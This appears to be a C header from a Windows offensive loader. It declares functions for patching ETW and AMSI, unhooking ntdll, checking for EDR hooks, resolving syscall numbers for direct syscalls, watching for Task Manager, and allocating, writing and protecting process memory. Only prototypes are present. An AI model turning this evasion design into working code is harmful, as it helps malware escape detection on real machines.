#pragma once

BOOL EtwPatch();
BOOL EdrHookerCheck();
BOOL unhook_Ntdll();
BOOL AmsiPatch();
DWORD getSSN(char* funcName);
extern DWORD g_ssn;
extern PVOID g_syscall;
PVOID getSyscallAddr(char* funcName);
BOOL WatchForTaskmgr();
BOOL IsElevated();


//syscalls
NTSTATUS iNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
NTSTATUS iNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
NTSTATUS iNtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
